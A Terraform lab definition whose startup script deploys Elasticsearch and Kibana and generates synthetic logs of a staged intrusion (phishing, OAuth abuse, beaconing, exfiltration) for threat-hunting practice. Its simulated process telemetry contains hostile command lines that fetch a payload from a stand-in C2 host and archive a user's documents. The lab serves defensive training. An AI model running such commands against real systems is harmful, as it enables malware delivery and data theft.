# ============================================================================
# Threat Hunting Lab 2 — Beacon and Exfiltration Hunt
# Terraform: 1x GCE VM running Elasticsearch + Kibana (via Docker) + Nginx Basic Auth
# Datasets generated (last 72h):
#   - network-flow-*          (beaconing + large exfil transfer + noise)
#   - dns-logs-*              (c2-example.com + subdomains + noise)
#   - workload-telemetry-*    (curl/wget/python/tar/zip + archive creation + noise)
#   - cloud-storage-audit-*   (storage.objects.insert for archive + noise)
# Also creates Kibana Data Views automatically.
# ============================================================================

resource "random_id" "lab_user_suffix" {
  byte_length = 3
}

locals {
  lab_user = "lab-${random_id.lab_user_suffix.hex}"
}

resource "random_password" "lab_pass" {
  length  = 16
  special = false
}

resource "google_compute_firewall" "allow_http" {
  name      = "allow-http"
  network   = "default"
  direction = "INGRESS"

  allow {
    protocol = "tcp"
    ports    = ["80"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["thl-beacon-lab"]
}

resource "google_compute_instance" "thl_beacon_lab" {
  name         = "thl-beacon-lab"
  project      = var.gcp_project_id
  machine_type = "e2-standard-4"
  zone         = var.gcp_zone
  tags         = ["thl-beacon-lab"]

  boot_disk {
    initialize_params {
      image = "ubuntu-os-cloud/ubuntu-2204-lts"
      size  = 50
      type  = "pd-balanced"
    }
  }

  network_interface {
    network = "default"
    access_config {}
  }

  metadata_startup_script = <<-EOF
#!/usr/bin/env bash
set -euo pipefail

exec > >(tee -a /var/log/startup-script.log) 2>&1
echo "[+] Startup script begin: $(date -Is)"
trap 'echo "[!] ERROR at line $LINENO. Last command: $BASH_COMMAND"' ERR

export DEBIAN_FRONTEND=noninteractive
sleep 20

retry() {
  local n=0
  local max=12
  local delay=5
  until "$@"; do
    n=$((n+1))
    if [ "$n" -ge "$max" ]; then
      echo "[!] Command failed after $n attempts: $*"
      return 1
    fi
    echo "[!] Command failed: $*. Retrying in $${delay}s..."
    sleep "$delay"
  done
}

echo "[+] Updating apt"
retry apt-get update -y

LAB_USER="${local.lab_user}"
LAB_PASS="${random_password.lab_pass.result}"
echo "[+] Generated lab creds: $${LAB_USER} / (hidden)"

mkdir -p /opt/lab
chmod 755 /opt/lab
printf "Kibana Basic Auth\nUsername: %s\nPassword: %s\n" "$LAB_USER" "$LAB_PASS" > /opt/lab/creds.txt
chmod 600 /opt/lab/creds.txt

echo "[+] Installing dependencies"
retry apt-get install -y ca-certificates curl gnupg apache2-utils jq python3

echo "[+] Installing Docker Engine"
install -m 0755 -d /etc/apt/keyrings
retry bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg"
chmod a+r /etc/apt/keyrings/docker.gpg

cat >/etc/apt/sources.list.d/docker.list <<'DOCKERLIST'
deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu jammy stable
DOCKERLIST

retry apt-get update -y
retry apt-get install -y docker-ce docker-ce-cli containerd.io
systemctl enable --now docker
docker --version

echo "[+] Installing docker-compose v1 binary"
retry curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
/usr/local/bin/docker-compose version || true

echo "[+] Preparing lab folders"
rm -rf /opt/lab/{nginx,bulk,scripts} || true
mkdir -p /opt/lab/{nginx,bulk,scripts}
chmod -R 777 /opt/lab/bulk
cd /opt/lab

echo "[+] Creating htpasswd"
htpasswd -bc /opt/lab/nginx/.htpasswd "$LAB_USER" "$LAB_PASS"

echo "[+] Writing nginx.conf"
tee /opt/lab/nginx/nginx.conf >/dev/null <<'NGINX'
events {}
http {
  upstream kibana_upstream { server kibana:5601; }

  server {
    listen 80;
    server_name _;

    auth_basic "Threat Hunting Lab";
    auth_basic_user_file /etc/nginx/.htpasswd;

    location / {
      proxy_pass http://kibana_upstream;
      proxy_set_header Host $host;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }
  }
}
NGINX

echo "[+] Writing docker-compose.yml"
tee /opt/lab/docker-compose.yml >/dev/null <<'YAML'
version: "3.8"
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.13.4
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms2g -Xmx2g
    volumes:
      - esdata:/usr/share/elasticsearch/data
    networks: [labnet]

  kibana:
    image: docker.elastic.co/kibana/kibana:8.13.4
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on: [elasticsearch]
    networks: [labnet]

  nginx:
    image: nginx:1.27-alpine
    depends_on: [kibana]
    ports:
      - "80:80"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/.htpasswd:/etc/nginx/.htpasswd:ro
    networks: [labnet]

networks:
  labnet:

volumes:
  esdata:
YAML

echo "[+] Starting stack"
docker-compose up -d
docker ps

###############################################################################
# Generate datasets
###############################################################################
echo "[+] Generating synthetic datasets"

tee /opt/lab/scripts/generate_bulk.py >/dev/null <<'PY'
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(42)

OUT_DIR = Path("/opt/lab/bulk")
OUT_DIR.mkdir(parents=True, exist_ok=True)

NOW = datetime.now(timezone.utc)
START = NOW - timedelta(days=7)

def iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def index_name(prefix: str, dt: datetime) -> str:
    return f"{prefix}-{dt.strftime('%Y.%m.%d')}"

def write_bulk(path: Path, records):
    with path.open("w", encoding="utf-8") as f:
        for idx, doc in records:
            f.write(json.dumps({"index": {"_index": idx}}) + "\n")
            f.write(json.dumps(doc) + "\n")

def rand_dt():
    delta = NOW - START
    return START + timedelta(seconds=random.randint(0, int(delta.total_seconds())))

def make_event(dataset, etype, action, outcome="success"):
    return {
        "dataset": dataset,
        "type": etype,
        "action": action,
        "outcome": outcome,
    }

# --------------------------------------------------------------------------
# Geography / baseline
# --------------------------------------------------------------------------
GEO = {
    # United States baseline
    "3.221.14.9": ("United States", "Ashburn"),
    "18.205.44.12": ("United States", "New York"),
    "44.214.90.33": ("United States", "Virginia"),
    "52.86.120.44": ("United States", "Chicago"),
    "34.227.18.77": ("United States", "Dallas"),

    # Foreign / suspicious
    "51.158.91.22": ("France", "Paris"),
    "91.198.174.192": ("Russia", "Moscow"),
    "101.89.33.17": ("China", "Beijing"),
    "185.220.101.1": ("Germany", "Frankfurt"),

    # IOC infra
    "203.0.113.10": ("United States", "Phoenix"),
}

IPS_US = [
    "3.221.14.9",
    "18.205.44.12",
    "44.214.90.33",
    "52.86.120.44",
    "34.227.18.77",
]

IPS_WORLD = [
    "51.158.91.22",
    "91.198.174.192",
    "101.89.33.17",
    "185.220.101.1",
]

def geo(ip):
    country, city = GEO.get(ip, ("Unknown", "Unknown"))
    return {"country_name": country, "city_name": city}

# --------------------------------------------------------------------------
# Identities / entities
# --------------------------------------------------------------------------
victim = "emily.carter@workspace-lab.com"
admin = "daniel.reed@workspace-lab.com"
attacker = "alex.morgan@external-mail.net"

users = [
    victim,
    admin,
    "olivia.bennett@workspace-lab.com",
    "nathan.hughes@workspace-lab.com",
    "sophia.mitchell@workspace-lab.com",
    "jacob.turner@workspace-lab.com",
    "finance.lead@workspace-lab.com",
    "hr.manager@workspace-lab.com",
    "legal.counsel@workspace-lab.com",
    "it.support@workspace-lab.com",
]

internal_senders = [
    "daniel.reed@workspace-lab.com",
    "olivia.bennett@workspace-lab.com",
    "nathan.hughes@workspace-lab.com",
    "sophia.mitchell@workspace-lab.com",
    "jacob.turner@workspace-lab.com",
    "it.support@workspace-lab.com",
    "noreply@workspace-lab.com",
    "hr.manager@workspace-lab.com",
    "finance.lead@workspace-lab.com",
]

external_senders = [
    "billing@secure-invoice-mail.com",
    "accounts@vendor-billing.net",
    "notify@payment-review.com",
    "invoices@document-center.co",
]

AFFECTED_HOST = "WKSTN-044"
OTHER_HOSTS = ["WKSTN-019", "WKSTN-101", "SRV-APP-02", "SRV-FILES-01"]
ALL_HOSTS = [AFFECTED_HOST] + OTHER_HOSTS

IOC_IP = "203.0.113.10"
IOC_DOMAIN = "c2-example.com"
IOC_HASH = "7b2c9a1f4d9e8c0a3d2f1e0b9a8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c"
OAUTH_CLIENT_ID = "oauth-client-9f3c2a1b"
OAUTH_APP_NAME = "Invoice Viewer Pro"

LEGIT_OAUTH_CLIENTS = {
    "oauth-client-111111": "Drive Sync for Finance",
    "oauth-client-222222": "Calendar Helper Enterprise",
    "oauth-client-333333": "Docs Export Assistant",
}

PHISH_SUBJECT = "Invoice overdue - Action required"
PHISH_MSG_ID = "msg-7b2c9a1f"
PHISH_FROM = random.choice(external_senders)
PHISH_LINK = "https://invoice-portal.example/verify"

SENSITIVE_FILES = [
    {"name": "Q4_Finance_Report.xlsx", "sensitivity": "high"},
    {"name": "Payroll_2026.csv", "sensitivity": "high"},
    {"name": "Contracts_Master.pdf", "sensitivity": "medium"},
    {"name": "Strategy_Deck.pptx", "sensitivity": "medium"},
]

NOISE_FILES = [
    {"name": "Team_Plan.docx", "sensitivity": "low"},
    {"name": "Logo.png", "sensitivity": "low"},
    {"name": "Onboarding_Guide.pdf", "sensitivity": "low"},
    {"name": "Travel_Request_Form.docx", "sensitivity": "low"},
]

DRIVE_FOLDERS = ["Finance", "HR", "Legal", "Exec", "Projects", "Shared"]

# --------------------------------------------------------------------------
# Attack timeline
# --------------------------------------------------------------------------
t_delivery = NOW - timedelta(days=2, hours=3)
t_login = t_delivery + timedelta(minutes=12)
t_oauth_grant = t_delivery + timedelta(minutes=18)
t_rule = t_delivery + timedelta(minutes=36)
t_dns_start = t_delivery + timedelta(minutes=52)
t_beacon_start = t_delivery + timedelta(minutes=55)
t_hash_exec = t_delivery + timedelta(hours=1, minutes=20)
t_drive_recon = t_delivery + timedelta(hours=1, minutes=34)
t_download = t_delivery + timedelta(hours=1, minutes=49)
t_share = t_delivery + timedelta(hours=1, minutes=57)
t_priv_esc = t_delivery + timedelta(hours=2, minutes=14)
t_large_transfer = t_delivery + timedelta(hours=2, minutes=25)
t_cloud_upload = t_delivery + timedelta(hours=2, minutes=31)
t_token_refresh = t_delivery + timedelta(hours=5)

email_records = []
auth_records = []
oauth_records = []
mailbox_records = []
drive_records = []
audit_records = []
dns_records = []
network_records = []
workload_records = []
cloud_storage_records = []

# --------------------------------------------------------------------------
# email-logs-* : noise
# --------------------------------------------------------------------------
subjects = [
    "Weekly Finance Update",
    "Board Meeting Notes",
    "Access Request Approved",
    "Updated HR Policy",
    "Team Lunch Invitation",
    "Invoice Copy",
    "Project Phoenix Review",
    "Timesheet Reminder",
    "Legal Review Requested",
    "Q4 Budget Draft",
    "Travel Reimbursement Status",
    "Vendor Contract Follow-up",
]
attachments = [None, "pdf", "docx", "xlsx", "png", None, None]

for _ in range(900):
    dt = rand_dt()
    subj = random.choice(subjects)
    sender = random.choice(internal_senders + ["partner@vendor.com"])
    recipient = random.choice(users)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("email", "email_delivery", "email_delivery"),
        "message": {
            "subject": subj,
            "id": f"msg-{random.randint(100000,999999)}",
        },
        "sender": {"email": sender},
        "recipient": {"email": recipient},
        "attachment": {"type": random.choice(attachments)},
    }
    email_records.append((index_name("email-logs", dt), doc))

email_records.append((
    index_name("email-logs", t_delivery),
    {
        "@timestamp": iso(t_delivery),
        "event": make_event("email", "email_delivery", "email_delivery"),
        "message": {
            "subject": PHISH_SUBJECT,
            "id": PHISH_MSG_ID,
            "link": PHISH_LINK,
            "display_name": "Microsoft Billing",
        },
        "sender": {"email": PHISH_FROM},
        "recipient": {"email": victim},
        "attachment": {"type": "pdf"},
        "labels": ["external", "invoice", "urgent"],
        "rule": {"name": "phishing_delivery_candidate"},
    }
))

# --------------------------------------------------------------------------
# auth-logs-* : normal signins
# --------------------------------------------------------------------------
for _ in range(1200):
    dt = rand_dt()
    user = random.choice(users)
    ip = random.choice(IPS_US)
    host = random.choice(ALL_HOSTS)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("auth", "login", "login"),
        "user": {"email": user},
        "source": {"ip": ip},
        "geo": geo(ip),
        "user_agent": {
            "original": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6)",
                "Mozilla/5.0 (X11; Linux x86_64)",
            ])
        },
        "device": {"name": host},
    }
    auth_records.append((index_name("auth-logs", dt), doc))

auth_records.append((
    index_name("auth-logs", t_login),
    {
        "@timestamp": iso(t_login),
        "event": make_event("auth", "login", "login"),
        "user": {"email": victim},
        "source": {"ip": "91.198.174.192"},
        "geo": geo("91.198.174.192"),
        "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        "device": {"name": AFFECTED_HOST},
        "risk": {"score": 88},
        "rule": {"name": "foreign_login_after_phishing"},
    }
))

# --------------------------------------------------------------------------
# oauth-events-* : noise
# --------------------------------------------------------------------------
oauth_catalog = dict(LEGIT_OAUTH_CLIENTS)
oauth_catalog[OAUTH_CLIENT_ID] = OAUTH_APP_NAME
oauth_types = ["oauth.token_issued", "oauth.refresh", "oauth.token_revoked"]

for _ in range(800):
    dt = rand_dt()
    user = random.choice(users)
    et = random.choice(oauth_types)
    cid = random.choice(list(oauth_catalog.keys()))
    ip = random.choice(IPS_US + IPS_WORLD)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("oauth", et, et),
        "user": {"email": user},
        "oauth": {"client_id": cid, "app_name": oauth_catalog[cid]},
        "source": {"ip": ip},
        "geo": geo(ip),
    }
    oauth_records.append((index_name("oauth-events", dt), doc))

oauth_records.append((
    index_name("oauth-events", NOW - timedelta(days=4)),
    {
        "@timestamp": iso(NOW - timedelta(days=4)),
        "event": make_event("oauth", "oauth_grant", "oauth_grant"),
        "user": {"email": admin},
        "oauth": {
            "client_id": "oauth-client-111111",
            "app_name": "Drive Sync for Finance",
            "scope": ["drive.read"],
        },
        "source": {"ip": "3.221.14.9"},
        "geo": geo("3.221.14.9"),
    }
))

oauth_records.append((
    index_name("oauth-events", t_oauth_grant),
    {
        "@timestamp": iso(t_oauth_grant),
        "event": make_event("oauth", "oauth_grant", "oauth_grant"),
        "user": {"email": victim},
        "oauth": {
            "client_id": OAUTH_CLIENT_ID,
            "app_name": OAUTH_APP_NAME,
            "scope": ["mail.read", "drive.read", "drive.write"],
        },
        "source": {"ip": "51.158.91.22"},
        "geo": geo("51.158.91.22"),
        "risk": {"score": 92},
        "related": {"message_id": PHISH_MSG_ID},
        "rule": {"name": "suspicious_oauth_grant"},
    }
))

oauth_records.append((
    index_name("oauth-events", t_drive_recon - timedelta(minutes=2)),
    {
        "@timestamp": iso(t_drive_recon - timedelta(minutes=2)),
        "event": make_event("oauth", "oauth.token_issued", "oauth.token_issued"),
        "user": {"email": victim},
        "oauth": {
            "client_id": OAUTH_CLIENT_ID,
            "app_name": OAUTH_APP_NAME,
        },
        "source": {"ip": "3.221.14.9"},
        "geo": geo("3.221.14.9"),
        "risk": {"score": 80},
        "rule": {"name": "token_issued_for_suspicious_client"},
    }
))

oauth_records.append((
    index_name("oauth-events", t_token_refresh),
    {
        "@timestamp": iso(t_token_refresh),
        "event": make_event("oauth", "oauth.refresh", "oauth.refresh"),
        "user": {"email": victim},
        "oauth": {
            "client_id": OAUTH_CLIENT_ID,
            "app_name": OAUTH_APP_NAME,
        },
        "source": {"ip": "3.221.14.9"},
        "geo": geo("3.221.14.9"),
        "risk": {"score": 78},
        "rule": {"name": "token_refresh_persistence"},
    }
))

# --------------------------------------------------------------------------
# mailbox-rules-* : noise
# --------------------------------------------------------------------------
rule_actions = ["addFilter", "insertSetting", "createForwarding", "deleteFilter"]

for _ in range(450):
    dt = rand_dt()
    user = random.choice(users)
    action = random.choice(rule_actions)
    fwd = random.choice([None, "archive@workspace-lab.com", "assistant@workspace-lab.com", None])

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("mailbox", action, action),
        "user": {"email": user},
        "rule": {"name": f"rule-{random.randint(1000,9999)}"},
        "forwarding": {"address": fwd},
    }
    mailbox_records.append((index_name("mailbox-rules", dt), doc))

mailbox_records.append((
    index_name("mailbox-rules", NOW - timedelta(days=3)),
    {
        "@timestamp": iso(NOW - timedelta(days=3)),
        "event": make_event("mailbox", "createForwarding", "createForwarding"),
        "user": {"email": admin},
        "rule": {"name": "admin-travel-forward"},
        "forwarding": {"address": "assistant@workspace-lab.com"},
        "destination": {"email": "assistant@workspace-lab.com"},
    }
))

mailbox_records.append((
    index_name("mailbox-rules", t_rule),
    {
        "@timestamp": iso(t_rule),
        "event": make_event("mailbox", "createForwarding", "createForwarding"),
        "user": {"email": victim},
        "rule": {
            "name": "mailbox_forwarding_persistence",
            "display_name": "Auto-Forward Invoices",
        },
        "forwarding": {"address": attacker},
        "destination": {"email": attacker},
        "rule_details": {"criteria": "subject contains invoice", "action": "forward"},
        "risk": {"score": 89},
    }
))

# --------------------------------------------------------------------------
# drive-activity-* : noise
# --------------------------------------------------------------------------
drive_events = [
    "drive.file_view",
    "drive.download",
    "drive.share",
    "drive.permission_change",
    "drive.file_edit",
]
all_files = SENSITIVE_FILES + NOISE_FILES

for _ in range(1100):
    dt = rand_dt()
    user = random.choice(users)
    ev = random.choice(drive_events)
    f = random.choice(all_files)
    target_email = random.choice([
        None,
        "olivia.bennett@workspace-lab.com",
        "nathan.hughes@workspace-lab.com",
        "sophia.mitchell@workspace-lab.com",
        "partner@external.com",
        "auditor@external.com",
    ])
    source_ip = random.choice(IPS_US)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("drive", ev, ev),
        "user": {"email": user},
        "file": {
            "name": f["name"],
            "folder": random.choice(DRIVE_FOLDERS),
            "sensitivity": f["sensitivity"],
        },
        "target": {"email": target_email},
        "source": {"ip": source_ip},
        "geo": geo(source_ip),
    }
    drive_records.append((index_name("drive-activity", dt), doc))

drive_records.append((
    index_name("drive-activity", NOW - timedelta(days=5)),
    {
        "@timestamp": iso(NOW - timedelta(days=5)),
        "event": make_event("drive", "drive.share", "drive.share"),
        "user": {"email": admin},
        "file": {"name": "Contracts_Master.pdf", "folder": "Legal", "sensitivity": "medium"},
        "target": {"email": "partner@external.com"},
        "share": {"permission": "reader", "external": True},
        "source": {"ip": "3.221.14.9"},
        "geo": geo("3.221.14.9"),
    }
))

for i, f in enumerate(SENSITIVE_FILES):
    dt = t_drive_recon + timedelta(minutes=i * 2)
    drive_records.append((
        index_name("drive-activity", dt),
        {
            "@timestamp": iso(dt),
            "event": make_event("drive", "drive.file_view", "drive.file_view"),
            "user": {"email": victim},
            "file": {"name": f["name"], "folder": "Finance", "sensitivity": f["sensitivity"]},
            "source": {"ip": "3.221.14.9"},
            "geo": geo("3.221.14.9"),
            "risk": {"score": 72},
            "rule": {"name": "post_compromise_drive_recon"},
        }
    ))

for i, f in enumerate(SENSITIVE_FILES[:2]):
    dt = t_download + timedelta(minutes=i * 3)
    drive_records.append((
        index_name("drive-activity", dt),
        {
            "@timestamp": iso(dt),
            "event": make_event("drive", "drive.download", "drive.download"),
            "user": {"email": victim},
            "file": {"name": f["name"], "folder": "Finance", "sensitivity": f["sensitivity"]},
            "source": {"ip": "3.221.14.9"},
            "geo": geo("3.221.14.9"),
            "risk": {"score": 84},
            "rule": {"name": "suspicious_drive_download"},
        }
    ))

drive_records.append((
    index_name("drive-activity", t_share),
    {
        "@timestamp": iso(t_share),
        "event": make_event("drive", "drive.share", "drive.share"),
        "user": {"email": victim},
        "file": {"name": "Q4_Finance_Report.xlsx", "folder": "Finance", "sensitivity": "high"},
        "target": {"email": attacker},
        "share": {"permission": "reader", "external": True},
        "source": {"ip": "3.221.14.9"},
        "geo": geo("3.221.14.9"),
        "risk": {"score": 95},
        "rule": {"name": "external_share_exfil"},
    }
))

# --------------------------------------------------------------------------
# audit-logs-* : admin / IAM activity
# --------------------------------------------------------------------------
roles = [
    "roles/viewer",
    "roles/logging.viewer",
    "roles/compute.viewer",
    "roles/storage.objectViewer",
    "roles/editor",
]

for _ in range(500):
    dt = rand_dt()
    actor = random.choice([admin, victim, "nathan.hughes@workspace-lab.com", "it.support@workspace-lab.com"])
    role = random.choice(roles)
    change = random.choice(["add", "remove"])
    ip = random.choice(IPS_US)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("audit", "setIamPolicy", "setIamPolicy"),
        "actor": {"email": actor},
        "iam": {"role": role, "change": change},
        "resource": {"type": "cloud_project", "name": "corp-prod"},
        "source": {"ip": ip},
        "geo": geo(ip),
    }
    audit_records.append((index_name("audit-logs", dt), doc))

audit_records.append((
    index_name("audit-logs", t_priv_esc),
    {
        "@timestamp": iso(t_priv_esc),
        "event": make_event("audit", "setIamPolicy", "setIamPolicy"),
        "actor": {"email": victim},
        "iam": {"role": "roles/owner", "change": "add"},
        "resource": {"type": "cloud_project", "name": "corp-prod"},
        "source": {"ip": "91.198.174.192"},
        "geo": geo("91.198.174.192"),
        "risk": {"score": 93},
        "rule": {"name": "privilege_escalation_owner_grant"},
    }
))

# --------------------------------------------------------------------------
# dns-logs-* : benign + IOC lookups
# --------------------------------------------------------------------------
common_domains = [
    "google.com",
    "microsoft.com",
    "github.com",
    "elastic.co",
    "news.example.com",
    "cdn.example.net",
]

for _ in range(2200):
    dt = rand_dt()
    src_host = random.choice(ALL_HOSTS)
    src_ip = random.choice(IPS_US)
    q = random.choice(common_domains)

    doc = {
        "@timestamp": iso(dt),
        "event": make_event("dns", "dns_query", "dns_query"),
        "dns": {"question": {"name": q}, "response_code": "NOERROR"},
        "source": {"ip": src_ip, "host": {"name": src_host}},
    }
    dns_records.append((index_name("dns-logs", dt), doc))

for i in range(90):
    dt = t_dns_start + timedelta(minutes=i * 3)
    sub = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(10))
    q = f"{sub}.{IOC_DOMAIN}"
    dns_records.append((
        index_name("dns-logs", dt),
        {
            "@timestamp": iso(dt),
            "event": make_event("dns", "dns_query", "dns_query"),
            "dns": {"question": {"name": q}, "response_code": "NOERROR"},
            "source": {"ip": "3.221.14.9", "host": {"name": AFFECTED_HOST}},
            "user": {"email": victim},
        }
    ))

# --------------------------------------------------------------------------
# network-flow-* : benign + beaconing + large transfer
# --------------------------------------------------------------------------
def net_doc(dt, src_host, src_ip, dst_ip=None, dst_domain=None, bytes_out=1200, user=None):
    doc = {
        "@timestamp": iso(dt),
        "event": make_event("netflow", "network_flow", "network_flow"),
        "network": {"direction": "outbound", "transport": "tcp"},
        "source": {"ip": src_ip, "host": {"name": src_host}},
        "destination": {"ip": dst_ip, "domain": dst_domain},
        "bytes_out": bytes_out,
    }
    if user:
        doc["user"] = {"email": user}
    return doc

for _ in range(1800):
    dt = rand_dt()
    src_host = random.choice(ALL_HOSTS)
    src_ip = random.choice(IPS_US)
    dst_ip = random.choice(IPS_US + IPS_WORLD)
    dst_domain = random.choice(["updates.example.com", "cdn.example.net", "api.service.com", "storage.cloud.com", None])
    bytes_out = random.choice([800, 1200, 2000, 4200, 9000, 15000])
    user = random.choice([victim, admin, "nathan.hughes@workspace-lab.com", None])
    network_records.append((index_name("network-flow", dt), net_doc(dt, src_host, src_ip, dst_ip, dst_domain, bytes_out, user)))

for i in range(60):
    dt = t_beacon_start + timedelta(minutes=i * 5)
    bytes_out = random.choice([900, 1100, 1300, 1500])
    network_records.append((
        index_name("network-flow", dt),
        net_doc(dt, AFFECTED_HOST, "3.221.14.9", IOC_IP, IOC_DOMAIN, bytes_out, victim)
    ))

network_records.append((
    index_name("network-flow", t_large_transfer),
    net_doc(t_large_transfer, AFFECTED_HOST, "3.221.14.9", IOC_IP, IOC_DOMAIN, 8200000, victim)
))

# --------------------------------------------------------------------------
# workload-telemetry-* : benign + hash execution + tool usage
# --------------------------------------------------------------------------
def workload_doc(dt, host, user, pname, cmd, parent, sha):
    return {
        "@timestamp": iso(dt),
        "event": make_event("workload", "start", "process_start"),
        "host": {"name": host},
        "user": {"email": user},
        "process": {
            "name": pname,
            "command_line": cmd,
            "parent": {"name": parent},
            "hash": {"sha256": sha},
        },
        "file": {"hash": {"sha256": sha}},
    }

benign = [
    ("chrome", "/usr/bin/google-chrome --profile-directory=Default", "systemd"),
    ("python", "python3 -m http.server 8000", "bash"),
    ("backup-agent", "/usr/local/bin/backup-agent --run", "systemd"),
    ("sshd", "sshd: user@pts/0", "systemd"),
]

for _ in range(1400):
    dt = rand_dt()
    host = random.choice(ALL_HOSTS)
    user = random.choice([victim, admin, "nathan.hughes@workspace-lab.com", "olivia.bennett@workspace-lab.com"])
    pname, cmd, parent = random.choice(benign)
    sha = "".join(random.choice("0123456789abcdef") for _ in range(64))
    workload_records.append((index_name("workload-telemetry", dt), workload_doc(dt, host, user, pname, cmd, parent, sha)))

workload_records.append((
    index_name("workload-telemetry", t_hash_exec),
    {
        **workload_doc(
            t_hash_exec,
            AFFECTED_HOST,
            victim,
            "dropper",
            f"/tmp/dropper --connect {IOC_DOMAIN} --stage",
            "bash",
            IOC_HASH,
        ),
        "rule": {"name": "ioc_hash_execution"},
    }
))

tool_chain = [
    ("curl", f"curl -fsSL http://{IOC_DOMAIN}/payload.bin -o /tmp/payload.bin", "bash"),
    ("python", "python3 /tmp/payload.py --run", "bash"),
    ("zip", "zip -r /tmp/archive.zip /home/emily/Documents", "bash"),
]
for i, (p, cmd, parent) in enumerate(tool_chain):
    dt = t_hash_exec + timedelta(minutes=5 + i * 6)
    sha = "".join(random.choice("0123456789abcdef") for _ in range(64))
    workload_records.append((
        index_name("workload-telemetry", dt),
        workload_doc(dt, AFFECTED_HOST, victim, p, cmd, parent, sha)
    ))

# --------------------------------------------------------------------------
# cloud-storage-* : benign + suspicious upload
# --------------------------------------------------------------------------
def cs_doc(dt, actor, obj, ip):
    return {
        "@timestamp": iso(dt),
        "event": make_event("cloud_storage", "storage.objects.insert", "storage.objects.insert"),
        "actor": {"email": actor},
        "object": {"name": obj},
        "source": {"ip": ip},
        "geo": geo(ip),
        "resource": {"type": "bucket", "name": "external-exfil-bucket"},
    }

for _ in range(400):
    dt = rand_dt()
    actor = random.choice(["backup-sa@workspace-lab.com", "reporting-sa@workspace-lab.com", admin])
    obj = f"reports/report-{random.randint(1000,9999)}.json"
    ip = random.choice(IPS_US)
    cloud_storage_records.append((index_name("cloud-storage", dt), cs_doc(dt, actor, obj, ip)))

cloud_storage_records.append((
    index_name("cloud-storage", t_cloud_upload),
    {
        **cs_doc(t_cloud_upload, victim, "archive.zip", "3.221.14.9"),
        "rule": {"name": "suspected_cloud_storage_exfil"},
    }
))

# --------------------------------------------------------------------------
# Write BULK files
# --------------------------------------------------------------------------
write_bulk(OUT_DIR / "email-logs.bulk.ndjson", email_records)
write_bulk(OUT_DIR / "auth-logs.bulk.ndjson", auth_records)
write_bulk(OUT_DIR / "oauth-events.bulk.ndjson", oauth_records)
write_bulk(OUT_DIR / "mailbox-rules.bulk.ndjson", mailbox_records)
write_bulk(OUT_DIR / "drive-activity.bulk.ndjson", drive_records)
write_bulk(OUT_DIR / "audit-logs.bulk.ndjson", audit_records)
write_bulk(OUT_DIR / "dns-logs.bulk.ndjson", dns_records)
write_bulk(OUT_DIR / "network-flow.bulk.ndjson", network_records)
write_bulk(OUT_DIR / "workload-telemetry.bulk.ndjson", workload_records)
write_bulk(OUT_DIR / "cloud-storage.bulk.ndjson", cloud_storage_records)

print("BULK generated:")
for p in sorted(OUT_DIR.glob("*.ndjson")):
    print(" -", p, p.stat().st_size, "bytes")
PY

python3 /opt/lab/scripts/generate_bulk.py
ls -lh /opt/lab/bulk || true

ES_CID="$(docker ps --format '{{.ID}} {{.Names}}' | awk '$2 ~ /elasticsearch/ {print $1; exit}')"
if [ -z "$ES_CID" ]; then
  echo "[!] Could not find Elasticsearch container"
  docker ps
  exit 10
fi
echo "[+] Elasticsearch container ID: $ES_CID"

echo "[+] Waiting for Elasticsearch readiness"
ES_READY="false"
for i in {1..240}; do
  if docker exec -i "$ES_CID" curl -s http://localhost:9200 >/dev/null 2>&1; then
    echo "[+] Elasticsearch is ready"
    ES_READY="true"
    break
  fi
  sleep 2
done

if [[ "$ES_READY" != "true" ]]; then
  echo "[!] Elasticsearch did not become ready"
  docker ps -a
  docker logs "$ES_CID" --tail 200 || true
  exit 11
fi

echo "[+] Bulk importing into Elasticsearch"
for f in /opt/lab/bulk/*.ndjson; do
  echo "[+] Loading $f ..."
  err=$(docker exec -i "$ES_CID" \
    curl -s -H "Content-Type: application/x-ndjson" \
    -XPOST "http://localhost:9200/_bulk?refresh=true" \
    --data-binary @- < "$f" | jq -r '.errors')
  echo "[+] errors=$err"
  if [[ "$err" != "false" ]]; then
    echo "[!] Bulk import returned errors for $f"
    exit 20
  fi
done

echo "[+] Verifying indices"
docker exec -i "$ES_CID" curl -s "http://localhost:9200/_cat/indices?v" || true

###############################################################################
# Create Kibana Data Views
###############################################################################
echo "[+] Waiting for Kibana API through Nginx"
KIBANA_READY="false"
for i in {1..300}; do
  code=$(curl -s -u "$LAB_USER:$LAB_PASS" -o /dev/null -w "%%{http_code}" http://localhost/api/status || true)
  if [[ "$code" == "200" ]]; then
    echo "[+] Kibana API is ready"
    KIBANA_READY="true"
    break
  fi
  sleep 2
done

if [[ "$KIBANA_READY" != "true" ]]; then
  echo "[!] Kibana did not become ready through Nginx"
  docker ps -a
  docker logs "$(docker ps --format '{{.ID}} {{.Names}}' | awk '$2 ~ /kibana/ {print $1; exit}')" --tail 200 || true
